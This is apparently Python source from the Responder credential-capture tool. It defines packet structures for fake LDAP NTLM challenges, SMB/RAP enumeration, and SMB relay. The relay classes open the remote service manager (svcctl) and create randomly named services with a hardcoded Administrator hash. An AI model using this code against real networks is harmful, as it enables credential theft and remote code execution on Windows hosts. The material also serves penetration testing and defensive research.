        ("NegTokenInitSeqMechMessageVersionReserved","\x00\x00\x00"),
        ("NegTokenInitSeqMechMessageVersionNTLMType","\x0f"),
        ("NTLMSSPNtWorkstationName","SMB12"),
        ("NTLMSSPNTLMChallengeAVPairsId","\x02\x00"),
        ("NTLMSSPNTLMChallengeAVPairsLen","\x0a\x00"),
        ("NTLMSSPNTLMChallengeAVPairsUnicodeStr","smb12"),
        ("NTLMSSPNTLMChallengeAVPairs1Id","\x01\x00"),
        ("NTLMSSPNTLMChallengeAVPairs1Len","\x1e\x00"),
        ("NTLMSSPNTLMChallengeAVPairs1UnicodeStr","SERVER2008"), 
        ("NTLMSSPNTLMChallengeAVPairs2Id","\x04\x00"),
        ("NTLMSSPNTLMChallengeAVPairs2Len","\x1e\x00"),
        ("NTLMSSPNTLMChallengeAVPairs2UnicodeStr","smb12.local"), 
        ("NTLMSSPNTLMChallengeAVPairs3Id","\x03\x00"),
        ("NTLMSSPNTLMChallengeAVPairs3Len","\x1e\x00"),
        ("NTLMSSPNTLMChallengeAVPairs3UnicodeStr","SERVER2008.smb12.local"),
        ("NTLMSSPNTLMChallengeAVPairs5Id","\x05\x00"),
        ("NTLMSSPNTLMChallengeAVPairs5Len","\x04\x00"),
        ("NTLMSSPNTLMChallengeAVPairs5UnicodeStr","smb12.local"),
        ("NTLMSSPNTLMChallengeAVPairs6Id","\x00\x00"),
        ("NTLMSSPNTLMChallengeAVPairs6Len","\x00\x00"),
    ])

    def calculate(self):

        ##Convert strings to Unicode first...
        self.fields["NTLMSSPNtWorkstationName"] = self.fields["NTLMSSPNtWorkstationName"].encode('utf-16le')
        self.fields["NTLMSSPNTLMChallengeAVPairsUnicodeStr"] = self.fields["NTLMSSPNTLMChallengeAVPairsUnicodeStr"].encode('utf-16le')
        self.fields["NTLMSSPNTLMChallengeAVPairs1UnicodeStr"] = self.fields["NTLMSSPNTLMChallengeAVPairs1UnicodeStr"].encode('utf-16le')
        self.fields["NTLMSSPNTLMChallengeAVPairs2UnicodeStr"] = self.fields["NTLMSSPNTLMChallengeAVPairs2UnicodeStr"].encode('utf-16le')
        self.fields["NTLMSSPNTLMChallengeAVPairs3UnicodeStr"] = self.fields["NTLMSSPNTLMChallengeAVPairs3UnicodeStr"].encode('utf-16le')
        self.fields["NTLMSSPNTLMChallengeAVPairs5UnicodeStr"] = self.fields["NTLMSSPNTLMChallengeAVPairs5UnicodeStr"].encode('utf-16le')

        ###### Workstation Offset
        CalculateOffsetWorkstation = str(self.fields["NTLMSSPSignature"])+str(self.fields["NTLMSSPSignatureNull"])+str(self.fields["NTLMSSPMessageType"])+str(self.fields["NTLMSSPNtWorkstationLen"])+str(self.fields["NTLMSSPNtWorkstationMaxLen"])+str(self.fields["NTLMSSPNtWorkstationBuffOffset"])+str(self.fields["NTLMSSPNtNegotiateFlags"])+str(self.fields["NTLMSSPNtServerChallenge"])+str(self.fields["NTLMSSPNtReserved"])+str(self.fields["NTLMSSPNtTargetInfoLen"])+str(self.fields["NTLMSSPNtTargetInfoMaxLen"])+str(self.fields["NTLMSSPNtTargetInfoBuffOffset"])+str(self.fields["NegTokenInitSeqMechMessageVersionHigh"])+str(self.fields["NegTokenInitSeqMechMessageVersionLow"])+str(self.fields["NegTokenInitSeqMechMessageVersionBuilt"])+str(self.fields["NegTokenInitSeqMechMessageVersionReserved"])+str(self.fields["NegTokenInitSeqMechMessageVersionNTLMType"])

        ###### AvPairs Offset
        CalculateLenAvpairs = str(self.fields["NTLMSSPNTLMChallengeAVPairsId"])+str(self.fields["NTLMSSPNTLMChallengeAVPairsLen"])+str(self.fields["NTLMSSPNTLMChallengeAVPairsUnicodeStr"])+str(self.fields["NTLMSSPNTLMChallengeAVPairs1Id"])+str(self.fields["NTLMSSPNTLMChallengeAVPairs1Len"])+str(self.fields["NTLMSSPNTLMChallengeAVPairs1UnicodeStr"])+(self.fields["NTLMSSPNTLMChallengeAVPairs2Id"])+str(self.fields["NTLMSSPNTLMChallengeAVPairs2Len"])+str(self.fields["NTLMSSPNTLMChallengeAVPairs2UnicodeStr"])+(self.fields["NTLMSSPNTLMChallengeAVPairs3Id"])+str(self.fields["NTLMSSPNTLMChallengeAVPairs3Len"])+str(self.fields["NTLMSSPNTLMChallengeAVPairs3UnicodeStr"])+(self.fields["NTLMSSPNTLMChallengeAVPairs5Id"])+str(self.fields["NTLMSSPNTLMChallengeAVPairs5Len"])+str(self.fields["NTLMSSPNTLMChallengeAVPairs5UnicodeStr"])+(self.fields["NTLMSSPNTLMChallengeAVPairs6Id"])+str(self.fields["NTLMSSPNTLMChallengeAVPairs6Len"])

        ###### LDAP Packet Len
        CalculatePacketLen = str(self.fields["MessageIDASNID"])+str(self.fields["MessageIDASNLen"])+str(self.fields["MessageIDASNStr"])+str(self.fields["OpHeadASNID"])+str(self.fields["OpHeadASNIDLenOfLen"])+str(self.fields["OpHeadASNIDLen"])+str(self.fields["Status"])+str(self.fields["StatusASNLen"])+str(self.fields["StatusASNStr"])+str(self.fields["MatchedDN"])+str(self.fields["ErrorMessage"])+str(self.fields["SequenceHeader"])+str(self.fields["SequenceHeaderLen"])+str(self.fields["SequenceHeaderLenOfLen"])+CalculateOffsetWorkstation+str(self.fields["NTLMSSPNtWorkstationName"])+CalculateLenAvpairs


        OperationPacketLen = str(self.fields["Status"])+str(self.fields["StatusASNLen"])+str(self.fields["StatusASNStr"])+str(self.fields["MatchedDN"])+str(self.fields["ErrorMessage"])+str(self.fields["SequenceHeader"])+str(self.fields["SequenceHeaderLen"])+str(self.fields["SequenceHeaderLenOfLen"])+CalculateOffsetWorkstation+str(self.fields["NTLMSSPNtWorkstationName"])+CalculateLenAvpairs

        NTLMMessageLen = CalculateOffsetWorkstation+str(self.fields["NTLMSSPNtWorkstationName"])+CalculateLenAvpairs

        ##### LDAP Len Calculation:
        self.fields["ParserHeadASNLen"] = struct.pack(">i", len(CalculatePacketLen))
        self.fields["OpHeadASNIDLen"] = struct.pack(">i", len(OperationPacketLen))
        self.fields["SequenceHeaderLen"] = struct.pack(">B", len(NTLMMessageLen))

        ##### Workstation Offset Calculation:
        self.fields["NTLMSSPNtWorkstationBuffOffset"] = struct.pack("<i", len(CalculateOffsetWorkstation))
        self.fields["NTLMSSPNtWorkstationLen"] = struct.pack("<h", len(str(self.fields["NTLMSSPNtWorkstationName"])))
        self.fields["NTLMSSPNtWorkstationMaxLen"] = struct.pack("<h", len(str(self.fields["NTLMSSPNtWorkstationName"])))

        ##### IvPairs Offset Calculation:
        self.fields["NTLMSSPNtTargetInfoBuffOffset"] = struct.pack("<i", len(CalculateOffsetWorkstation+str(self.fields["NTLMSSPNtWorkstationName"])))
        self.fields["NTLMSSPNtTargetInfoLen"] = struct.pack("<h", len(CalculateLenAvpairs))
        self.fields["NTLMSSPNtTargetInfoMaxLen"] = struct.pack("<h", len(CalculateLenAvpairs))
        ##### IvPair Calculation:
        self.fields["NTLMSSPNTLMChallengeAVPairs5Len"] = struct.pack("<h", len(str(self.fields["NTLMSSPNTLMChallengeAVPairs5UnicodeStr"])))
        self.fields["NTLMSSPNTLMChallengeAVPairs3Len"] = struct.pack("<h", len(str(self.fields["NTLMSSPNTLMChallengeAVPairs3UnicodeStr"])))
        self.fields["NTLMSSPNTLMChallengeAVPairs2Len"] = struct.pack("<h", len(str(self.fields["NTLMSSPNTLMChallengeAVPairs2UnicodeStr"])))
        self.fields["NTLMSSPNTLMChallengeAVPairs1Len"] = struct.pack("<h", len(str(self.fields["NTLMSSPNTLMChallengeAVPairs1UnicodeStr"])))
        self.fields["NTLMSSPNTLMChallengeAVPairsLen"] = struct.pack("<h", len(str(self.fields["NTLMSSPNTLMChallengeAVPairsUnicodeStr"])))


########NEW FILE########
__FILENAME__ = odict
# NBT-NS/LLMNR Responder
# Created by Laurent Gaffie
# Copyright (C) 2014 Trustwave Holdings, Inc.
#
# This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
# 
# You should have received a copy of the GNU General Public License
# along with this program.  If not, see <http://www.gnu.org/licenses/>.

from UserDict import DictMixin

class OrderedDict(dict, DictMixin):

    def __init__(self, *args, **kwds):
        if len(args) > 1:
            raise TypeError('expected at most 1 arguments, got %d' % len(args))
        try:
            self.__end
        except AttributeError:
            self.clear()
        self.update(*args, **kwds)

    def clear(self):
        self.__end = end = []
        end += [None, end, end]
        self.__map = {}
        dict.clear(self)

    def __setitem__(self, key, value):
        if key not in self:
            end = self.__end
            curr = end[1]
            curr[2] = end[1] = self.__map[key] = [key, curr, end]
        dict.__setitem__(self, key, value)

    def __delitem__(self, key):
        dict.__delitem__(self, key)
        key, prev, next = self.__map.pop(key)
        prev[2] = next
        next[1] = prev

    def __iter__(self):
        end = self.__end
        curr = end[2]
        while curr is not end:
            yield curr[0]
            curr = curr[2]

    def __reversed__(self):
        end = self.__end
        curr = end[1]
        while curr is not end:
            yield curr[0]
            curr = curr[1]

    def popitem(self, last=True):
        if not self:
            raise KeyError('dictionary is empty')
        if last:
            key = reversed(self).next()
        else:
            key = iter(self).next()
        value = self.pop(key)
        return key, value

    def __reduce__(self):
        items = [[k, self[k]] for k in self]
        tmp = self.__map, self.__end
        del self.__map, self.__end
        inst_dict = vars(self).copy()
        self.__map, self.__end = tmp
        if inst_dict:
            return (self.__class__, (items,), inst_dict)
        return self.__class__, (items,)

    def keys(self):
        return list(self)

    setdefault = DictMixin.setdefault
    update = DictMixin.update
    pop = DictMixin.pop
    values = DictMixin.values
    items = DictMixin.items
    iterkeys = DictMixin.iterkeys
    itervalues = DictMixin.itervalues
    iteritems = DictMixin.iteritems

    def __repr__(self):
        if not self:
            return '%s()' % (self.__class__.__name__,)
        return '%s(%r)' % (self.__class__.__name__, self.items())

    def copy(self):
        return self.__class__(self)

    @classmethod
    def fromkeys(cls, iterable, value=None):
        d = cls()
        for key in iterable:
            d[key] = value
        return d

    def __eq__(self, other):
        if isinstance(other, OrderedDict):
            return len(self)==len(other) and \
                   min(p==q for p, q in  zip(self.items(), other.items()))
        return dict.__eq__(self, other)

    def __ne__(self, other):
        return not self == other

########NEW FILE########
__FILENAME__ = RAPLANMANPackets
import struct
from odict import OrderedDict

def longueur(payload):
    length = struct.pack(">i", len(''.join(payload)))
    return length

class Packet():
    fields = OrderedDict([
        ("data", ""),
    ])
    def __init__(self, **kw):
        self.fields = OrderedDict(self.__class__.fields)
        for k,v in kw.items():
            if callable(v):
                self.fields[k] = v(self.fields[k])
            else:
                self.fields[k] = v
    def __str__(self):
        return "".join(map(str, self.fields.values()))


class SMBHeader(Packet):
    fields = OrderedDict([
        ("proto", "\xff\x53\x4d\x42"),
        ("cmd", "\x72"),
        ("error-code", "\x00\x00\x00\x00" ),
        ("flag1", "\x08"),
        ("flag2", "\x01\x00"),
        ("pidhigh", "\x00\x00"),
        ("signature", "\x00\x00\x00\x00\x00\x00\x00\x00"),
        ("reserved", "\x00\x00"),
        ("tid", "\x00\x00"),
        ("pid", "\x3c\x1b"),
        ("uid", "\x00\x00"),
        ("mid", "\x00\x00"),
    ])

class SMBNegoData(Packet):
    fields = OrderedDict([
        ("wordcount", "\x00"),
        ("bcc", "\x54\x00"),
        ("separator1","\x02" ),
        ("dialect1", "\x50\x43\x20\x4e\x45\x54\x57\x4f\x52\x4b\x20\x50\x52\x4f\x47\x52\x41\x4d\x20\x31\x2e\x30\x00"),
        ("separator2","\x02"),
        ("dialect2", "\x4c\x41\x4e\x4d\x41\x4e\x31\x2e\x30\x00"),
    ])
    def calculate(self):
        CalculateBCC = str(self.fields["separator1"])+str(self.fields["dialect1"])+str(self.fields["separator2"])+str(self.fields["dialect2"])
        self.fields["bcc"] = struct.pack("<h",len(CalculateBCC))

class SMBSessionData(Packet):
    fields = OrderedDict([
        ("wordcount", "\x0a"),
        ("AndXCommand", "\xff"),
        ("reserved","\x00"),
        ("andxoffset", "\x00\x00"),
        ("maxbuff","\xff\xff"),
        ("maxmpx", "\x02\x00"),
        ("vcnum","\x01\x00"),
        ("sessionkey", "\x00\x00\x00\x00"),
        ("PasswordLen","\x18\x00"),
        ("reserved2","\x00\x00\x00\x00"),
        ("bcc","\x3b\x00"),
        ("AccountPassword",""),
        ("AccountName",""),
        ("AccountNameTerminator","\x00"),
        ("PrimaryDomain","WORKGROUP"),
        ("PrimaryDomainTerminator","\x00"),
        ("NativeOs","Unix"),
        ("NativeOsTerminator","\x00"),
        ("NativeLanman","Samba"),
        ("NativeLanmanTerminator","\x00"),

    ])
    def calculate(self): 
        CompleteBCC = str(self.fields["AccountPassword"])+str(self.fields["AccountName"])+str(self.fields["AccountNameTerminator"])+str(self.fields["PrimaryDomain"])+str(self.fields["PrimaryDomainTerminator"])+str(self.fields["NativeOs"])+str(self.fields["NativeOsTerminator"])+str(self.fields["NativeLanman"])+str(self.fields["NativeLanmanTerminator"])
        self.fields["bcc"] = struct.pack("<h", len(CompleteBCC))
        self.fields["PasswordLen"] = struct.pack("<h", len(str(self.fields["AccountPassword"])))

class SMBTreeConnectData(Packet):
    fields = OrderedDict([
        ("Wordcount", "\x04"),
        ("AndXCommand", "\xff"),
        ("Reserved","\x00" ),
        ("Andxoffset", "\x00\x00"),
        ("Flags","\x08\x00"),
        ("PasswdLen", "\x01\x00"),
        ("Bcc","\x1b\x00"),
        ("Passwd", "\x00"),
        ("Path",""),
        ("PathTerminator","\x00"),
        ("Service","?????"),
        ("Terminator", "\x00"),

    ])
    def calculate(self): 
        self.fields["PasswdLen"] = struct.pack("<h", len(str(self.fields["Passwd"])))[:2]
        BccComplete = str(self.fields["Passwd"])+str(self.fields["Path"])+str(self.fields["PathTerminator"])+str(self.fields["Service"])+str(self.fields["Terminator"])
        self.fields["Bcc"] = struct.pack("<h", len(BccComplete))

class RAPNetServerEnum3Data(Packet):
    fields = OrderedDict([
        ("Command", "\xd7\x00"),
        ("ParamDescriptor", "WrLehDzz"),
        ("ParamDescriptorTerminator", "\x00"),
        ("ReturnDescriptor","B16BBDz"),
        ("ReturnDescriptorTerminator", "\x00"),
        ("DetailLevel", "\x01\x00"),
        ("RecvBuff","\xff\xff"),
        ("ServerType", "\x00\x00\x00\x80"),
        ("TargetDomain","SMB"),
        ("RapTerminator","\x00"),
        ("TargetName","ABCD"),
        ("RapTerminator2","\x00"),
    ])

class SMBTransRAPData(Packet):
    fields = OrderedDict([
        ("Wordcount", "\x0e"),
        ("TotalParamCount", "\x24\x00"),
        ("TotalDataCount","\x00\x00" ),
        ("MaxParamCount", "\x08\x00"),
        ("MaxDataCount","\xff\xff"),
        ("MaxSetupCount", "\x00"),
        ("Reserved","\x00\x00"),
        ("Flags", "\x00"),
        ("Timeout","\x00\x00\x00\x00"),
        ("Reserved1","\x00\x00"),
        ("ParamCount","\x24\x00"),
        ("ParamOffset", "\x5a\x00"),
        ("DataCount", "\x00\x00"),
        ("DataOffset", "\x7e\x00"),
        ("SetupCount", "\x00"),
        ("Reserved2", "\x00"),
        ("Bcc", "\x3f\x00"),
        ("Terminator", "\x00"),
        ("PipeName", "\\PIPE\\LANMAN"),
        ("PipeTerminator","\x00\x00"),
        ("Data", ""),

    ])
    def calculate(self):
        #Padding
        if len(str(self.fields["Data"]))%2==0:
           self.fields["PipeTerminator"] = "\x00\x00\x00\x00"
        else:
           self.fields["PipeTerminator"] = "\x00\x00\x00"
        ##Convert Path to Unicode first before any Len calc.
        self.fields["PipeName"] = self.fields["PipeName"].encode('utf-16le')
        ##Data Len
        self.fields["TotalParamCount"] = struct.pack("<i", len(str(self.fields["Data"])))[:2]
        self.fields["ParamCount"] = struct.pack("<i", len(str(self.fields["Data"])))[:2]
        ##Packet len
        FindRAPOffset = str(self.fields["Wordcount"])+str(self.fields["TotalParamCount"])+str(self.fields["TotalDataCount"])+str(self.fields["MaxParamCount"])+str(self.fields["MaxDataCount"])+str(self.fields["MaxSetupCount"])+str(self.fields["Reserved"])+str(self.fields["Flags"])+str(self.fields["Timeout"])+str(self.fields["Reserved1"])+str(self.fields["ParamCount"])+str(self.fields["ParamOffset"])+str(self.fields["DataCount"])+str(self.fields["DataOffset"])+str(self.fields["SetupCount"])+str(self.fields["Reserved2"])+str(self.fields["Bcc"])+str(self.fields["Terminator"])+str(self.fields["PipeName"])+str(self.fields["PipeTerminator"])

        self.fields["ParamOffset"] = struct.pack("<i", len(FindRAPOffset)+32)[:2]
        ##Bcc Buff Len
        BccComplete    = str(self.fields["Terminator"])+str(self.fields["PipeName"])+str(self.fields["PipeTerminator"])+str(self.fields["Data"])
        self.fields["Bcc"] = struct.pack("<i", len(BccComplete))[:2]

########NEW FILE########
__FILENAME__ = RelayPackets
# NBT-NS/LLMNR Responder
# Created by Laurent Gaffie
# Copyright (C) 2014 Trustwave Holdings, Inc.
#
# This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
# 
# You should have received a copy of the GNU General Public License
# along with this program.  If not, see <http://www.gnu.org/licenses/>.
import struct
from odict import OrderedDict

class Packet():
    fields = OrderedDict([
        ("data", ""),
    ])
    def __init__(self, **kw):
        self.fields = OrderedDict(self.__class__.fields)
        for k,v in kw.items():
            if callable(v):
                self.fields[k] = v(self.fields[k])
            else:
                self.fields[k] = v
    def __str__(self):
        return "".join(map(str, self.fields.values()))
##################################################################################
#SMB Client Stuff
##################################################################################

def longueur(payload):
    length = struct.pack(">i", len(''.join(payload)))
    return length

class SMBHeader(Packet):
    fields = OrderedDict([
        ("proto", "\xff\x53\x4d\x42"),
        ("cmd", "\x72"),
        ("error-code", "\x00\x00\x00\x00" ),
        ("flag1", "\x00"),
        ("flag2", "\x00\x00"),
        ("pidhigh", "\x00\x00"),
        ("signature", "\x00\x00\x00\x00\x00\x00\x00\x00"),
        ("reserved", "\x00\x00"),
        ("tid", "\x00\x00"),
        ("pid", "\x00\x4e"),
        ("uid", "\x00\x08"),
        ("mid", "\x00\x00"),
    ])

class SMBNego(Packet):
    fields = OrderedDict([
        ("Wordcount", "\x00"),
        ("Bcc", "\x62\x00"),
        ("Data", "")
    ])
    
    def calculate(self):
        self.fields["Bcc"] = struct.pack("<h",len(str(self.fields["Data"])))

class SMBNegoData(Packet):
    fields = OrderedDict([
        ("Separator1","\x02" ),
        ("Dialect1", "\x50\x43\x20\x4e\x45\x54\x57\x4f\x52\x4b\x20\x50\x52\x4f\x47\x52\x41\x4d\x20\x31\x2e\x30\x00"),
        ("Separator2","\x02"),
        ("Dialect2", "\x4c\x41\x4e\x4d\x41\x4e\x31\x2e\x30\x00"),
        ("Separator3","\x02"),
        ("Dialect3", "\x57\x69\x6e\x64\x6f\x77\x73\x20\x66\x6f\x72\x20\x57\x6f\x72\x6b\x67\x72\x6f\x75\x70\x73\x20\x33\x2e\x31\x61\x00"),
        ("Separator4","\x02"),
        ("Dialect4", "\x4c\x4d\x31\x2e\x32\x58\x30\x30\x32\x00"),
        ("Separator5","\x02"),
        ("Dialect5", "\x4c\x41\x4e\x4d\x41\x4e\x32\x2e\x31\x00"),
        ("Separator6","\x02"),
        ("Dialect6", "\x4e\x54\x20\x4c\x4d\x20\x30\x2e\x31\x32\x00"),
    ])

class SMBSessionTreeData(Packet):
    fields = OrderedDict([
        ("Wordcount",   "\x0d"),
        ("AndXCommand", "\x75"),
        ("Reserved",    "\x00" ),
        ("Andxoffset", "\x7c\x00"),
        ("Maxbuff","\x04\x11"),
        ("Maxmpx", "\x32\x00"),
        ("Vcnum","\x00\x00"),
        ("Sessionkey", "\x00\x00\x00\x00"),
        ("AnsiPassLength","\x18\x00"),
        ("UnicodePassLength", "\x00\x00"),
        ("Reserved2","\x00\x00\x00\x00"),
        ("Capabilities", "\xd4\x00\x00\x00"),
        ("Bcc","\x3f\x00"),   
        ("AnsiPasswd", "\xe3\xa7\x10\x56\x58\xed\x92\xa1\xea\x9d\x55\xb1\x63\x99\x7f\xbe\x1c\xbd\x6c\x0a\xf8\xef\xb2\x89"),
        ("UnicodePasswd", "\xe3\xa7\x10\x56\x58\xed\x92\xa1\xea\x9d\x55\xb1\x63\x99\x7f\xbe\x1c\xbd\x6c\x0a\xf8\xef\xb2\x89"),
        ("Username","Administrator"),
        ("UsernameTerminator","\x00\x00"),
        ("Domain","SMB"),
        ("DomainTerminator","\x00\x00"),
        ("Nativeos",""),
        ("NativeosTerminator","\x00\x00"),
        ("Lanmanager",""),
        ("LanmanagerTerminator","\x00\x00\x00"),
        ("Wordcount2","\x04"),
        ("Andxcmd2","\xff"),
        ("Reserved3","\x00"),
        ("Andxoffset2","\x06\x01"),
        ("Flags","\x08\x00"),
        ("PasswordLength","\x01\x00"),
        ("Bcc2","\x19\x00"),
        ("Passwd","\x00"),
        ("PrePath","\\\\"),
        ("Targ", "CSCDSFCS"),
        ("IPC", "\\IPC$"),
        ("TerminatorPath","\x00\x00"),
        ("Service","?????"),
        ("TerminatorService","\x00"),
    ])
    def calculate(self):
        ##Convert first
        self.fields["Username"] = self.fields["Username"].encode('utf-16be')
        self.fields["Domain"] = self.fields["Domain"].encode('utf-16be')
        self.fields["Nativeos"] = self.fields["Nativeos"].encode('utf-16be')
        self.fields["Lanmanager"] = self.fields["Lanmanager"].encode('utf-16be')
        self.fields["PrePath"] = self.fields["PrePath"].encode('utf-16le')
        self.fields["Targ"] = self.fields["Targ"].encode('utf-16le')
        self.fields["IPC"] = self.fields["IPC"].encode('utf-16le')
        ##Then calculate
        data1= str(self.fields["AnsiPasswd"])+(self.fields["UnicodePasswd"])+str(self.fields["Username"])+str(self.fields["UsernameTerminator"])+str(self.fields["Domain"])+str(self.fields["DomainTerminator"])+str(self.fields["Nativeos"])+str(self.fields["NativeosTerminator"])+str(self.fields["Lanmanager"])+str(self.fields["LanmanagerTerminator"])

        data2= str(self.fields["Passwd"])+str(self.fields["PrePath"])+str(self.fields["Targ"])+str(self.fields["IPC"])+str(self.fields["TerminatorPath"])+str(self.fields["Service"])+str(self.fields["TerminatorService"])

        self.fields["Bcc"] = struct.pack("<h",len(data1))
        self.fields["Bcc2"] = struct.pack("<h",len(data2))
        self.fields["Andxoffset"] = struct.pack("<h",len(data1)+32+29)
        self.fields["AnsiPassLength"] = struct.pack("<h",len(str(self.fields["AnsiPasswd"])))
        self.fields["UnicodePassLength"] = struct.pack("<h",len(str(self.fields["UnicodePasswd"])))
        self.fields["PasswordLength"] = struct.pack("<h",len(str(self.fields["Passwd"])))

class SMBNTCreateData(Packet):
    fields = OrderedDict([
        ("Wordcount",     "\x18"),
        ("AndXCommand",   "\xff"),
        ("Reserved",      "\x00" ),
        ("Andxoffset",    "\x00\x00"),
        ("Reserved2",     "\x00"),
        ("FileNameLen",   "\x07\x00"),
        ("CreateFlags",   "\x16\x00\x00\x00"),
        ("RootFID",       "\x00\x00\x00\x00"),
        ("AccessMask",    "\x00\x00\x00\x02"),
        ("AllocSize",     "\x00\x00\x00\x00\x00\x00\x00\x00"),
        ("FileAttrib",    "\x00\x00\x00\x00"),
        ("ShareAccess",   "\x07\x00\x00\x00"),
        ("Disposition",   "\x01\x00\x00\x00"),   
        ("CreateOptions", "\x00\x00\x00\x00"),
        ("Impersonation", "\x02\x00\x00\x00"),
        ("SecurityFlags", "\x00"),
        ("Bcc",           "\x08\x00"),
        ("FileName",      "\\svcctl"),
        ("FileNameNull",  "\x00"),
    ])

    def calculate(self):

        Data1= str(self.fields["FileName"])+str(self.fields["FileNameNull"])
        self.fields["FileNameLen"] = struct.pack("<h",len(str(self.fields["FileName"])))
        self.fields["Bcc"] = struct.pack("<h",len(Data1))

class SMBReadData(Packet):
    fields = OrderedDict([
        ("Wordcount",     "\x0a"),
        ("AndXCommand",   "\xff"),
        ("Reserved",      "\x00" ),
        ("Andxoffset",    "\x00\x00"),
        ("FID",           "\x00\x00"),
        ("Offset",        "\x19\x03\x00\x00"), 
        ("MaxCountLow",   "\xed\x01"),
        ("MinCount",      "\xed\x01"),
        ("Hidden",        "\xff\xff\xff\xff"),
        ("Remaining",     "\x00\x00"),  
        ("Bcc",           "\x00\x00"),
        ("Data", ""),
    ])

    def calculate(self):

        self.fields["Bcc"] = struct.pack("<h",len(str(self.fields["Data"])))

class SMBWriteData(Packet):
    fields = OrderedDict([
        ("Wordcount",     "\x0e"),
        ("AndXCommand",   "\xff"),
        ("Reserved",      "\x00" ),
        ("Andxoffset",    "\x00\x00"),
        ("FID",           "\x06\x40"),
        ("Offset",        "\xea\x03\x00\x00"),
        ("Reserved2",     "\xff\xff\xff\xff"),
        ("WriteMode",     "\x08\x00"),
        ("Remaining",     "\xdc\x02"),
        ("DataLenHi",     "\x00\x00"),
        ("DataLenLow",    "\xdc\x02"),
        ("DataOffset",    "\x3f\x00"),
        ("HiOffset",      "\x00\x00\x00\x00"),   
        ("Bcc",           "\xdc\x02"),
        ("Data", ""),
    ])

    def calculate(self):
        self.fields["Remaining"] = struct.pack("<h",len(str(self.fields["Data"])))
        self.fields["DataLenLow"] = struct.pack("<h",len(str(self.fields["Data"])))
        self.fields["Bcc"] = struct.pack("<h",len(str(self.fields["Data"])))

class SMBDCEData(Packet):
    fields = OrderedDict([
        ("Version",       "\x05"),
        ("VersionLow",    "\x00"),
        ("PacketType",    "\x0b"),
        ("PacketFlag",    "\x03"),
        ("DataRepresent", "\x10\x00\x00\x00"),
        ("FragLen",       "\x2c\x02"),
        ("AuthLen",       "\x00\x00"),
        ("CallID",        "\x00\x00\x00\x00"),
        ("MaxTransFrag",  "\xd0\x16"),
        ("MaxRecvFrag",   "\xd0\x16"),
        ("GroupAssoc",    "\x00\x00\x00\x00"),
        ("CTXNumber",     "\x01"),
        ("CTXPadding",    "\x00\x00\x00"),
        ("CTX0ContextID",  "\x00\x00"),
        ("CTX0ItemNumber", "\x01\x00"),
        ("CTX0UID", "\x81\xbb\x7a\x36\x44\x98\xf1\x35\xad\x32\x98\xf0\x38\x00\x10\x03"),
        ("CTX0UIDVersion", "\x02\x00"),
        ("CTX0UIDVersionlo","\x00\x00"),
        ("CTX0UIDSyntax",   "\x04\x5d\x88\x8a\xeb\x1c\xc9\x11\x9f\xe8\x08\x00\x2b\x10\x48\x60"),
        ("CTX0UIDSyntaxVer","\x02\x00\x00\x00"),
    ])

    def calculate(self):

        Data1= str(self.fields["Version"])+str(self.fields["VersionLow"])+str(self.fields["PacketType"])+str(self.fields["PacketFlag"])+str(self.fields["DataRepresent"])+str(self.fields["FragLen"])+str(self.fields["AuthLen"])+str(self.fields["CallID"])+str(self.fields["MaxTransFrag"])+str(self.fields["MaxRecvFrag"])+str(self.fields["GroupAssoc"])+str(self.fields["CTXNumber"])+str(self.fields["CTXPadding"])+str(self.fields["CTX0ContextID"])+str(self.fields["CTX0ItemNumber"])+str(self.fields["CTX0UID"])+str(self.fields["CTX0UIDVersion"])+str(self.fields["CTX0UIDVersionlo"])+str(self.fields["CTX0UIDSyntax"])+str(self.fields["CTX0UIDSyntaxVer"])


        self.fields["FragLen"] = struct.pack("<h",len(Data1))

class SMBDCEPacketData(Packet):
    fields = OrderedDict([
        ("Version",       "\x05"),
        ("VersionLow",    "\x00"),
        ("PacketType",    "\x00"),
        ("PacketFlag",    "\x03"),
        ("DataRepresent", "\x10\x00\x00\x00"),
        ("FragLen",       "\x2c\x02"),
        ("AuthLen",       "\x00\x00"),
        ("CallID",        "\x00\x00\x00\x00"),
        ("AllocHint",     "\x38\x00\x00\x00"),
        ("ContextID",     "\x00\x00"),
        ("Opnum",         "\x0f\x00"),
        ("Data",          ""),

    ])

    def calculate(self):

        Data1= str(self.fields["Version"])+str(self.fields["VersionLow"])+str(self.fields["PacketType"])+str(self.fields["PacketFlag"])+str(self.fields["DataRepresent"])+str(self.fields["FragLen"])+str(self.fields["AuthLen"])+str(self.fields["CallID"])+str(self.fields["AllocHint"])+str(self.fields["ContextID"])+str(self.fields["Opnum"])+str(self.fields["Data"])

        self.fields["FragLen"] = struct.pack("<h",len(Data1))
        self.fields["AllocHint"] = struct.pack("<i",len(str(self.fields["Data"])))

class SMBDCESVCCTLOpenManagerW(Packet):
    fields = OrderedDict([
        ("MachineNameRefID",     "\xb5\x97\xb9\xbc"),
        ("MaxCount",             "\x0f\x00\x00\x00"),
        ("Offset",               "\x00\x00\x00\x00"),
        ("ActualCount",          "\x0f\x00\x00\x00"),
        ("MachineName",          "\\\\169.220.1.11"),##This is not taken into consideration.
        ("MachineNameNull",      "\x00\x00\x00\x00"),
        ("DbPointer",            "\x00\x00\x00\x00"),
        ("AccessMask",           "\x3f\x00\x0f\x00"),
    ])

    def calculate(self):
        ## Convert to UTF-16LE
        self.fields["MachineName"] = self.fields["MachineName"].encode('utf-16le')


class SMBDCESVCCTLCreateService(Packet):
    fields = OrderedDict([
        ("ContextHandle",        ""),
        ("MaxCount",             "\x0c\x00\x00\x00"),
        ("Offset",               "\x00\x00\x00\x00"),
        ("ActualCount",          "\x0c\x00\x00\x00"),
        ("ServiceName",          "AyAGaxwLhCP"),
        ("MachineNameNull",      "\x00\x00"),
        ("ReferentID",           "\x9c\xfa\x9a\xc9"),
        ("MaxCountRefID",        "\x11\x00\x00\x00"),
        ("OffsetID",             "\x00\x00\x00\x00"),
        ("ActualCountRefID",     "\x11\x00\x00\x00"),
        ("DisplayNameID",        "DhhUFcsvrfJvLwRq"),
